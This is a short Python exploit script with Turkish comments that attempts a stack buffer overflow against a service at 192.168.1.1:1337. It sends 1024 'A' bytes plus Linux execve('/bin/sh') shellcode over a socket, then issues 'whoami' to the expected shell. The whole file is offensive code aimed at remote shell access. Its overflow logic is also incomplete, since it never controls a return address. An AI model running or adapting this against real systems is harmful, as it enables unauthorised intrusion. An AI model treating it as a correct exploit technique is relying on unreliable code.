import socket

# Hedef IP ve port
hedef_ip = "192.168.1.1"
hedef_port = 1337

# Yığın taşması için büyük bir tampon oluştur
tampon = b"A" * 1024

# Yığın taşması için gerekli shellcode oluştur
shellcode = b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"

# Tamponun sonuna shellcode ekle
tampon += shellcode

# Hedef sokete bağlan
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((hedef_ip, hedef_port))

# Yığın taşması için oluşturulan tamponu gönder
s.send(tampon)

# Yığın taşması sonrası shell almak için dinle
s.recv(1024)

# Shell komutları gönder
s.send(b"whoami\n")
s.recv(1024)
